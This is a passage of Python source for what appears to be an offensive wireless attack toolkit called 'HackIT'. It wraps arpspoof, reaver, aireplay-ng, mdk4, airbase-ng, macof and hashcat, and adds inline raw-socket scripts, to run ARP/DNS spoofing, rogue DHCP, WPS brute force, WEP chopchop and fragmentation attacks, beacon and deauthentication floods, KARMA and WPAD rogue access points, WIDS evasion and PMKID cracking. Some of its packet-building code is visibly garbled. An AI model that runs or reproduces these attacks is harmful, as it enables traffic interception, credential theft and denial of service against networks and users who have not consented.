        iface = kwargs.get("iface", self._default_iface())
        if not iface:
            UI.print_error("No interface specified.")
            return
        try:
            from hackit.network_scanner import get_gateway
        except ImportError:
            import socket as _sk
        try:
            UI.print_info(f"Starting ARP + DNS spoof: {target} → {spoof_ip} on {iface}")
            import socket as _sock
            dst_ip = _sock.gethostbyname(target) if not target.replace(".", "").isdigit() else target
            # detect gateway
            try:
                gw_out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
                gateway = gw_out.split()[2]
            except Exception:
                try:
                    gw_out = subprocess.check_output(["route", "-n"], text=True)
                    gateway = [l.split()[1] for l in gw_out.splitlines() if l.startswith("0.0.0.0")][0]
                except Exception:
                    gateway = self._detect_gateway()
            arpspoof = shutil.which("arpspoof")
            if not arpspoof:
                UI.print_warning("arpspoof not found, using raw ARP spoof")
                arp_proc = subprocess.Popen(
                    [sys.executable, "-c", f"""
import socket, struct, time
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
s.bind(('{iface}', 0))
src_mac = b'\\x02\\x00\\x00\\x00\\x00\\x01'
gw_mac_byte = bytes.fromhex(''.join('00' for _ in range(6)))
pkt = struct.pack('!6s6sHH', src_mac, struct.pack('!6s', bytes.fromhex('ffffff000000'.replace('ff','00'))), 1, 2) + src_mac + socket.inet_aton('{spoof_ip}') + bytes.fromhex('000000000000') + socket.inet_aton('{dst_ip}')
while True: s.send(pkt); time.sleep(2)
"""],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            else:
                arp_proc = subprocess.Popen(
                    [arpspoof, "-i", iface, "-t", dst_ip, gateway],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            UI.print_info(f"Poisoning ARP for {dst_ip} → {spoof_ip} ... Ctrl+C to stop")
            try:
                arp_proc.wait()
            except KeyboardInterrupt:
                arp_proc.terminate()
                subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
                UI.print_success("DNS spoof stopped.")
        except FileNotFoundError:
            UI.print_error("arpspoof not found. Install: apt install dsniff")
        except Exception as e:
            UI.print_error(f"DNS spoof failed: {e}")
            subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)

    # ── DHCP Spoof (Rogue DHCP server) ─────────────────────────

    def do_dhcp_spoof(self, interface: Optional[str] = None, pool: Optional[str] = None, **kwargs):
        interface = interface or self._default_iface()
        if not shutil.which("dnsmasq"):
            UI.print_error("dnsmasq required for DHCP spoof. Install: apt install dnsmasq")
            return
        UI.print_info(f"DHCP spoof on {interface} pool {pool}")
        conf = f"/tmp/hackit_dhcp_{interface}.conf"
        try:
            with open(conf, "w") as f:
                f.write(f"interface={interface}\n")
                f.write(f"dhcp-range={pool},255.255.255.0,12h\n")
                gw = self._detect_gateway()
                f.write(f"dhcp-option=3,{gw}\n")
                f.write(f"dhcp-option=6,{gw}\n")
                f.write("log-dhcp\n")
            proc = subprocess.Popen(["sudo", "dnsmasq", "-C", conf, "-d", "--no-resolv", "--no-hosts"],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            jid = self.jobs.start(f"dhcp-spoof-{interface}", proc)
            UI.print_success(f"Rogue DHCP server started on {interface} (job {jid})")
        except Exception as e:
            UI.print_error(f"DHCP spoof failed: {e}")

    # ── Crack display ────────────────────────────────────────────

    def do_crack_show(self, job_id: str = "", **kwargs):
        jobs = self.jobs.list_jobs()
        if job_id:
            jobs = [j for j in jobs if j["id"] == job_id]
            if not jobs:
                UI.print_error(f"Job '{job_id}' not found.")
                return
        if not jobs:
            UI.print_info("No crack jobs.")
            return
        table = Table(title="Crack Jobs", border_style="cyan")
        table.add_column("ID", style="yellow")
        table.add_column("Name", style="white")
        table.add_column("Status", style="green")
        table.add_column("Started", style="cyan")
        for j in jobs:
            if "crack" in j["name"].lower():
                table.add_row(j["id"], j["name"], j["status"], j["started"])
        _console.print(table)

    # ── WPS brute-force ──────────────────────────────────────────

    def do_wps_bruteforce(self, iface: str, bssid: str, **kwargs):
        """WPS PIN brute-force with a live rotating theme. Prefers reaver/bully
        and falls back to the C-native WPS PIN generator when neither is found."""
        from . import themes as TH
        iface = iface or self._default_iface()
        bssid = self._clean_bssid(bssid)
        timeout = int(kwargs.get("timeout") or 0)
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 8.0)
        channel = int(kwargs.get("channel") or 0)

        TH.phase_banner("deauth", f"WPS brute  iface={iface}  bssid={bssid}  timeout={timeout or 'unlimited'}s")

        reaver = shutil.which("reaver")
        bully = shutil.which("bully")
        cmd = None
        engine = ""
        if reaver:
            cmd = [reaver, "-i", iface, "-b", bssid, "-vv", "-K", "1"]
            if timeout:
                cmd.extend(["-t", str(timeout)])
            engine = "reaver"
        elif bully:
            cmd = [bully, iface, "-b", bssid, "-v", "3"]
            engine = "bully"

        if not cmd:
            UI.print_warning("No reaver/bully found — using C-native WPS PIN generator.")
            self.do_wps_pin(bssid)
            return

        state = {
            "bssid": bssid, "station": "WPS", "frames": 0, "pps": 0.0,
            "elapsed": 0.0, "errors": 0, "channel": channel or None,
            "reason": "pin", "band": "2.4",
        }
        started = time.time()
        found_pin = ""
        pin_pct = 0.0
        proc = None
        try:
            proc = self.bridge._popen(cmd)
            with TH.LiveOrchestra("deauth", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                while proc.poll() is None:
                    line = None
                    try:
                        if proc.stdout:
                            line = proc.stdout.readline()
                    except Exception:
                        line = None
                    t = time.time() - started
                    state["elapsed"] = t
                    if line:
                        txt = line.strip()
                        if txt:
                            m = re.search(r"(?:WPS PIN|pin)\s*[:=]\s*['\"]?(\d{4,8})", txt, re.I)
                            if m:
                                found_pin = m.group(1)
                            m = re.search(r"(\d+\.?\d*)%\s*(?:complete|done|progress)", txt, re.I)
                            if m:
                                try:
                                    pin_pct = float(m.group(1))
                                except ValueError:
                                    pass
                            state["frames"] = int(pin_pct)
                            state["reason"] = f"pin@{pin_pct:.1f}%" if pin_pct else "pin"
                    lo.refresh()
                    if found_pin:
                        proc.terminate()
                        break
                try:
                    proc.wait(timeout=2)
                except Exception:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
        except KeyboardInterrupt:
            if proc:
                try:
                    proc.terminate()
                except Exception:
                    pass
            UI.print_warning("WPS brute stopped by operator.")
        except EngineBuildError as e:
            UI.print_error(str(e))

        TH.summary_panel(
            [
                ("engine", engine),
                ("target", bssid),
                ("elapsed", f"{time.time() - started:.1f}s"),
                ("status", f"PIN {found_pin}" if found_pin else f"progress {pin_pct:.1f}%"),
            ],
            title="WPS BRUTE COMPLETE",
            accent="bright_green" if found_pin else "bright_yellow",
        )
        if found_pin:
            UI.print_success(f"WPS PIN recovered: {found_pin}  →  run `wps pin {bssid} --all` for PSK")

    # ── WEP chopchop attack ──────────────────────────────────────

    def do_wep_chopchop(self, iface: str, bssid: str, **kwargs):
        """WEP chopchop attack. aireplay-ng primary, C-FFI inject_chopchop native
        fallback that actually splices and replays decrypted ARP frames."""
        from . import themes as TH
        iface = iface or self._default_iface()
        bssid = self._clean_bssid(bssid)
        output = kwargs.get("output", f"wep_chop_{bssid.replace(':','')}.cap")
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 6.0)
        TH.phase_banner("deauth", f"WEP chopchop  iface={iface}  target={bssid}")

        aireplay = shutil.which("aireplay-ng")
        state = {
            "bssid": bssid, "station": "chop", "frames": 0, "pps": 0.0,
            "elapsed": 0.0, "errors": 0, "channel": kwargs.get("channel"),
            "reason": "chop", "band": "2.4",
        }
        started = time.time()
        proc = None
        engine = ""
        try:
            if aireplay:
                airodump = shutil.which("airodump-ng")
                if airodump:
                    prefix = output.rsplit(".", 1)[0]
                    self.bridge._popen([
                        airodump, "-c", str(kwargs.get("channel") or 1),
                        "--bssid", bssid, "-w", prefix,
                        "--output-format", "pcap", iface,
                    ])
                cmd = [aireplay, "--chopchop", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface]
                proc = self.bridge._popen(cmd)
                engine = "aireplay-ng"
            else:
                lib = self.bridge.c_lib()
                if lib is None:
                    UI.print_error("Neither aireplay-ng nor C engine available. Install aircrack-ng or run 'build c'.")
                    return
                engine = "c-ffi"
                state["reason"] = "native chopchop"

            with TH.LiveOrchestra("deauth", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                if proc is not None:
                    while proc.poll() is None:
                        line = None
                        try:
                            if proc.stdout:
                                line = proc.stdout.readline()
                        except Exception:
                            line = None
                        t = time.time() - started
                        state["elapsed"] = t
                        if line:
                            txt = line.strip()
                            if txt:
                                m = re.search(r"(\d+)\s*(?:packets|frames)\s*sent", txt, re.I)
                                if m:
                                    state["frames"] = int(m.group(1))
                                m = re.search(r"(\d+)%\s*(?:complete|done)", txt)
                                if m:
                                    state["reason"] = f"chop@{m.group(1)}%"
                                state["pps"] = state["frames"] / max(0.001, t)
                        lo.refresh()
                else:
                    # C-FFI chopchop: loop until we get a decrypted packet back
                    # or Ctrl-C. C function returns bytes_replayed.
                    max_attempts = int(kwargs.get("attempts") or 200)
                    for attempt in range(max_attempts):
                        try:
                            n, pkt = self.bridge.c_chopchop(iface, bssid, "")
                        except EngineBuildError:
                            n, pkt = 0, b""
                        if n > 0 and pkt:
                            state["frames"] = n
                            state["reason"] = f"got {n}B decrypted packet"
                            with open(output, "wb") as fh:
                                fh.write(pkt)
                            UI.print_success(f"Chopchop recovered {n} bytes → {output}")
                            break
                        state["errors"] += 0 if n >= 0 else 1
                        state["elapsed"] = time.time() - started
                        state["pps"] = state["frames"] / max(0.001, state["elapsed"])
                        lo.refresh()
                        time.sleep(0.4)
        except KeyboardInterrupt:
            if proc:
                try:
                    proc.terminate()
                except Exception:
                    pass
            UI.print_warning("WEP chopchop stopped by operator.")

        TH.summary_panel(
            [
                ("engine", engine),
                ("target", bssid),
                ("bytes recovered", f"{state['frames']:,}"),
                ("elapsed", f"{time.time() - started:.1f}s"),
            ],
            title="WEP CHOPCHOP COMPLETE",
            accent="bright_green" if state["frames"] else "bright_yellow",
        )

    # ── WEP Fragment (GUI alias: do_wep_fragment → do_wep_frag) ──

    def do_wep_fragment(self, interface: Optional[str] = None, bssid: str = "", count: int = 3000, **kwargs):
        interface = interface or self._default_iface()
        return self.do_wep_frag(iface=interface, bssid=bssid, count=count, **kwargs)

    # ── WEP fragmentation attack ─────────────────────────────────

    def do_wep_frag(self, iface: str, bssid: str, **kwargs):
        """WEP fragmentation attack. aireplay-ng primary, C-FFI inject_frag
        native fallback that builds and replays fragmented ARP frames."""
        from . import themes as TH
        iface = iface or self._default_iface()
        bssid = self._clean_bssid(bssid)
        output = kwargs.get("output", f"wep_frag_{bssid.replace(':','')}.cap")
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 6.0)
        frag_size = int(kwargs.get("frag_size") or 64)
        TH.phase_banner("deauth", f"WEP fragmentation  iface={iface}  target={bssid}")

        aireplay = shutil.which("aireplay-ng")
        state = {
            "bssid": bssid, "station": "frag", "frames": 0, "pps": 0.0,
            "elapsed": 0.0, "errors": 0, "channel": kwargs.get("channel"),
            "reason": "frag", "band": "2.4",
        }
        started = time.time()
        proc = None
        engine = ""
        try:
            if aireplay:
                airodump = shutil.which("airodump-ng")
                if airodump:
                    prefix = output.rsplit(".", 1)[0]
                    self.bridge._popen([
                        airodump, "-c", str(kwargs.get("channel") or 1),
                        "--bssid", bssid, "-w", prefix,
                        "--output-format", "pcap", iface,
                    ])
                proc = self.bridge._popen(
                    [aireplay, "--fragment", "-b", bssid, "-h", "FF:FF:FF:FF:FF:FF", iface]
                )
                engine = "aireplay-ng"
            else:
                lib = self.bridge.c_lib()
                if lib is None:
                    UI.print_error("Neither aireplay-ng nor C engine available. Install aircrack-ng or run 'build c'.")
                    return
                engine = "c-ffi"

            with TH.LiveOrchestra("deauth", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                if proc is not None:
                    while proc.poll() is None:
                        line = None
                        try:
                            if proc.stdout:
                                line = proc.stdout.readline()
                        except Exception:
                            line = None
                        t = time.time() - started
                        state["elapsed"] = t
                        if line:
                            txt = line.strip()
                            if txt:
                                m = re.search(r"(\d+)\s*(?:packets|frames)\s*sent", txt, re.I)
                                if m:
                                    state["frames"] = int(m.group(1))
                                m = re.search(r"(\d+)%\s*(?:complete|done)", txt)
                                if m:
                                    state["reason"] = f"frag@{m.group(1)}%"
                                state["pps"] = state["frames"] / max(0.001, t)
                        lo.refresh()
                else:
                    # C-FFI frag: loop, every successful call replays a
                    # fragmented frame toward the AP and returns 1.
                    max_attempts = int(kwargs.get("attempts") or 500)
                    for attempt in range(max_attempts):
                        try:
                            n = self.bridge.c_frag_attack(iface, bssid, "", frag_size)
                        except EngineBuildError:
                            n = 0
                        if n > 0:
                            state["frames"] += n
                            state["pps"] = state["frames"] / max(0.001, time.time() - started)
                            if state["frames"] == 1:
                                UI.print_success("Fragmentation established — replaying ARP.")
                        else:
                            state["errors"] += 1
                        state["elapsed"] = time.time() - started
                        lo.refresh()
                        time.sleep(0.3)
        except KeyboardInterrupt:
            if proc:
                try:
                    proc.terminate()
                except Exception:
                    pass
            UI.print_warning("WEP fragmentation stopped by operator.")

        TH.summary_panel(
            [
                ("engine", engine),
                ("target", bssid),
                ("frames replayed", f"{state['frames']:,}"),
                ("elapsed", f"{time.time() - started:.1f}s"),
            ],
            title="WEP FRAGMENTATION COMPLETE",
            accent="bright_green" if state["frames"] else "bright_yellow",
        )

    # ── Multi-SSID beacon flood ──────────────────────────────────

    def do_beacon_flood_multi(self, iface: str, ssids: list[str] = None, **kwargs):
        if not ssids:
            UI.print_error("No SSIDs provided.")
            return
        count = kwargs.get("count", 50)
        channel = kwargs.get("channel", 6)
        UI.print_info(f"Multi-SSID beacon flood: {len(ssids)} SSIDs on {iface} ch{channel}")
        try:
            import json
            ssid_json = json.dumps(ssids)
            cmd = [
                sys.executable, "-c",
                f"""
import socket, struct, time, json, sys
ssids = json.loads('{ssid_json}')
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
s.bind(('{iface}', 0))
while True:
    for ssid in ssids:
        bssid = bytes.fromhex(':'.join(ssid.encode().hex()[i:i+2] for i in range(0,12)).replace(':','').ljust(12,'0')[:12])
        frame = b'\\x80\\x00\\x00\\x00' + b'\\xff\\xff\\xff\\xff\\xff\\xff' + bssid * 2
        frame += b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'
        frame += struct.pack('B', len(ssid)) + ssid.encode()
        frame += b'\\x01\\x08\\x02\\x04\\x0b\\x0c\\x12\\x18\\x24\\x03\\x01\\x06'
        try: s.send(frame)
        except: pass
        time.sleep(0.01)
"""]
            proc = subprocess.Popen(
                ["sudo"] + cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            jid = self.jobs.start(f"beacon-multi-{len(ssids)}ssids", proc)
            UI.print_success(f"Beacon flood started (job {jid})")
        except Exception as e:
            UI.print_error(f"Beacon flood failed: {e}")

    # ── Auth DoS ──────────────────────────────────────────────
    def do_auth_dos(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"Auth DoS: {bssid} x{count} on {interface}")
        tool = _which("mdk4") or _which("mdk3")
        if tool:
            cmd = ["sudo", tool, interface, "a", "-a", bssid, "-s", str(count)]
            self.jobs.start(f"auth-dos-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success(f"Auth DoS started on {bssid}")
        else:
            UI.print_error("mdk4/mdk3 required for auth DoS")

    # ── Assoc Flood ───────────────────────────────────────────
    def do_assoc_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"Assoc flood: {bssid} x{count} on {interface}")
        tool = _which("mdk4") or _which("mdk3")
        if tool:
            cmd = ["sudo", tool, interface, "a", "-a", bssid, "-m", "-s", str(count)]
            self.jobs.start(f"assoc-flood-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success(f"Assoc flood started on {bssid}")
        else:
            UI.print_error("mdk4/mdk3 required for assoc flood")

    # ── EAPOL Start Flood ─────────────────────────────────────
    def do_eapol_start_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"EAPOL Start flood: {bssid} x{count}")
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-t", str(count)]
            self.jobs.start(f"eapol-start-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("EAPOL Start flood running")
        else:
            UI.print_error("mdk4 required")

    # ── EAPOL Logoff ──────────────────────────────────────────
    def do_eapol_logoff(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"EAPOL Logoff flood: {bssid}")
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-l", "-t", str(count)]
            self.jobs.start(f"eapol-logoff-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("EAPOL Logoff flood running")
        else:
            UI.print_error("mdk4 required")

    # ── CTS/RTS Flood ─────────────────────────────────────────
    def do_cts_flood(self, interface: Optional[str] = None, count: int = 1000, duration: int = 500, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "f", "-t", str(count), "-d", str(duration)]
            self.jobs.start("cts-flood", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("CTS flood running")
        else:
            UI.print_error("mdk4 required")

    # ── Power Save DoS ────────────────────────────────────────
    def do_powersave_dos(self, interface: Optional[str] = None, station: str = "", count: int = 2000, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "p", "-t", station, "-c", str(count)] if station else ["sudo", mdk, interface, "p", "-c", str(count)]
            self.jobs.start("powersave-dos", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Power Save DoS running")
        else:
            UI.print_error("mdk4 required")

    # ── Disassoc Flood ────────────────────────────────────────
    def do_disassoc_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"Disassoc flood: {bssid} x{count}")
        proc = subprocess.Popen(["bash", "-c", f"for i in $(seq 1 {count}); do sudo aireplay-ng -0 1 -a {bssid} {interface} 2>/dev/null; done"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.jobs.start(f"disassoc-{bssid}", proc)
        UI.print_success("Disassoc flood running")

    # ── WPAD Attack ───────────────────────────────────────────
    def do_wpad_attack(self, interface: Optional[str] = None, ssid: str = "", **kwargs):
        interface = interface or self._default_iface()
        if not ssid: ssid = f"HackIT_{int(time.time()) % 10000}"
        UI.print_info(f"WPAD attack: {ssid} on {interface}")
        if _which("airbase-ng"):
            proc = subprocess.Popen(["sudo", "airbase-ng", "-e", ssid, "-c", "6", "-P", interface],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.jobs.start(f"wpad-{ssid}", proc)
            UI.print_success(f"WPAP rogue AP '{ssid}' running — use responder to capture hashes")
        else:
            UI.print_error("airbase-ng required")

    # ── KARMA Attack ──────────────────────────────────────────
    def do_karma(self, interface: Optional[str] = None, channel: int = 6, ssid: str = "", verbose: bool = False, **kwargs):
        interface = interface or self._default_iface()
        ssid = ssid or "KARMA"
        UI.print_info(f"KARMA attack: responding to all probes on {interface}")
        if _which("airbase-ng"):
            proc = subprocess.Popen(["sudo", "airbase-ng", "-P", "-C", "30", "-e", ssid, "-c", str(channel), interface],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.jobs.start("karma", proc)
            UI.print_success("KARMA attack running — capturing client probes")
        else:
            UI.print_error("airbase-ng required")

    # ── MDA (Michaely Disassociation) ─────────────────────────
    def do_mda(self, interface: Optional[str] = None, bssid: str = "", count: int = 100, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "m", "-a", bssid, "-t", str(count)]
            self.jobs.start(f"mda-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success(f"MDA attack on {bssid}")
        else:
            UI.print_error("mdk4 required")

    # ── TKIP MIC Exploit ──────────────────────────────────────
    def do_tkip_mic(self, interface: Optional[str] = None, bssid: str = "", station: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "m", "-a", bssid]
            if station: cmd.extend(["-c", station])
            self.jobs.start(f"tkip-mic-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("TKIP MIC exploit running")
        else:
            UI.print_error("mdk4 required")

    # ── WIDS Evasion ──────────────────────────────────────────
    def do_wids_evasion(self, interface: Optional[str] = None, rate: int = 1, count: int = 100, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "w", "-e", "-t", str(count), "-s", str(rate)]
            self.jobs.start("wids-evasion", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("WIDS evasion running")
        else:
            UI.print_error("mdk4 required")

    # ── Fragmentation Attack ──────────────────────────────────
    def do_frag_attack(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "f", "-t", str(count)]
            self.jobs.start(f"frag-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Fragmentation attack running")
        else:
            UI.print_error("mdk4 required")

    # ── Omerta Attack ─────────────────────────────────────────
    def do_omerta(self, interface: Optional[str] = None, channel: int = 6, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "d", "-c", str(channel)]
            self.jobs.start("omerta", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Omerta attack running — blocking probe responses")
        else:
            UI.print_error("mdk4 required")

    # ── EAP Hammer ────────────────────────────────────────────
    def do_eap_hammer(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-t", str(count)]
            self.jobs.start(f"eap-hammer-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("EAP hammer running")
        else:
            UI.print_error("mdk4 required")

    # ── WPA Key Guess (offline) ───────────────────────────────
    def do_wpa_key_guess(self, pmkid: str = "", ssid: str = "", wordlist: str = "", **kwargs):
        if not wordlist:
            wordlist = "/usr/share/wordlists/rockyou.txt" if os.path.exists("/usr/share/wordlists/rockyou.txt") else "/usr/share/dict/words"
        if not pmkid:
            UI.print_error("PMKID hash required")
            return
        UI.print_info(f"WPA key guess: mode 16800 with {wordlist}")
        if _which("hashcat"):
            proc = subprocess.Popen(["hashcat", "-m", "16800", pmkid, wordlist, "--force", "--potfile-path", "/tmp/hackit_pot"],
                                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            self.jobs.start("wpa-key-guess", proc)
            UI.print_success("Key guessing started")
        else:
            UI.print_error("hashcat required")

    # ── RRB Attack ────────────────────────────────────────────
    def do_rrb_attack(self, interface: Optional[str] = None, bssid: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "d"]
            self.jobs.start("rrb-attack", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("RRB attack running")
        else:
            UI.print_error("mdk4 required")

    # ── CAPWAP Attack ─────────────────────────────────────────
    def do_capwap(self, interface: Optional[str] = None, controller: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "x"]
            self.jobs.start("capwap", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("CAPWAP attack running")
        else:
            UI.print_error("mdk4 required")

    # ── HIRB Attack ───────────────────────────────────────────
    def do_hirb(self, interface: Optional[str] = None, target: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "b", "-n", "HIRB"]
            self.jobs.start("hirb", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("HIRB attack running")
        else:
            UI.print_error("mdk4 required")

    # ── WPA2 Group Key Flood ──────────────────────────────────
    def do_wpa2_groupkey(self, interface: Optional[str] = None, bssid: str = "", count: int = 200, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "g", "-a", bssid, "-t", str(count)]
            self.jobs.start(f"groupkey-{bssid}", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("WPA2 group key flood running")
        else:
            UI.print_error("mdk4 required")

    # ── Wireless Bridge Attack ────────────────────────────────
    def do_bridge_attack(self, interface: Optional[str] = None, bridge_ip: str = "", **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "b"]
            self.jobs.start("bridge-attack", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Bridge attack running")
        else:
            UI.print_error("mdk4 required")

    # ── MAC Flooding ──────────────────────────────────────────
    def do_mac_flood(self, interface: Optional[str] = None, count: int = 5000, rate: int = 100, **kwargs):
        interface = interface or self._default_iface()
        if _which("macof"):
            cmd = ["sudo", "macof", "-i", interface, "-n", str(count), "-s", str(rate)]
            self.jobs.start("mac-flood", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("MAC flooding running")
        else:
            UI.print_error("macof (dsniff) required")

    # ── Known Beacon SSID ─────────────────────────────────────
    def do_known_beacon(self, interface: Optional[str] = None, list: str = "enterprise", channel: int = 6, **kwargs):
        interface = interface or self._default_iface()
        mdk = _which("mdk4")
        if mdk:
            cmd = ["sudo", mdk, interface, "b", "-c", str(channel)]
            self.jobs.start("known-beacon", subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            UI.print_success("Known beacon flood running")
        else:
            UI.print_error("mdk4 required")

    # ── Channel Survey ────────────────────────────────────────
    def do_channel_survey(self, interface: Optional[str] = None, **kwargs):
        interface = interface or self._default_iface()
        UI.print_info(f"Channel survey on {interface}")
        proc = subprocess.Popen(["sudo", "airodump-ng", "--band", "abg", interface, "--write", "/tmp/hackit_survey", "--output-format", "csv"],
                                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        self.jobs.start("channel-survey", proc)
        UI.print_success("Channel survey started (Ctrl+C to stop)")

    # ── Probe flood with custom SSIDs ────────────────────────────

    def do_probe_flood_ssids(self, iface: str, ssids: list[str] = None, **kwargs):
        """Probe request flood against a real SSID pool, with a live theme."""
        from . import themes as TH
        if not ssids:
            UI.print_error("No SSIDs provided.")
            return
        iface = iface or self._default_iface()
        count = int(kwargs.get("count", 100))
        theme_name = kwargs.get("theme")
        rotate = float(kwargs.get("rotate") or 5.0)
        TH.phase_banner("beacon", f"probe flood  iface={iface}  SSIDs={len(ssids)}  count={count}")
        state = {
            "ssids": ssids, "sent": 0, "pps": 0.0, "elapsed": 0.0,
            "channel": kwargs.get("channel") or 1, "per_channel": {},
        }
        started = time.time()
        errors = 0
        try:
            with TH.LiveOrchestra("beacon", state, theme=theme_name,
                                  rotate_every=rotate, refresh=10.0) as lo:
                for sname in ssids:
                    sent = 0
                    try:
                        proc = self.bridge.rust_probe_flood(iface, count)
                        try:
                            proc.wait(timeout=max(5, count // 200 + 2))
                        except Exception:
                            proc.terminate()
                        sent = count
                    except EngineBuildError:
                        errors += 1
                    state["sent"] += sent
                    state["elapsed"] = time.time() - started
                    state["pps"] = state["sent"] / max(0.001, state["elapsed"])
                    lo.refresh()
        except KeyboardInterrupt:
            UI.print_warning("Probe flood stopped by operator.")
        TH.summary_panel(
            [("iface", iface), ("probes", f"{state['sent']:,}"),
             ("errors", str(errors)), ("elapsed", f"{time.time() - started:.1f}s")],
            title="PROBE FLOOD COMPLETE", accent="bright_cyan",
        )
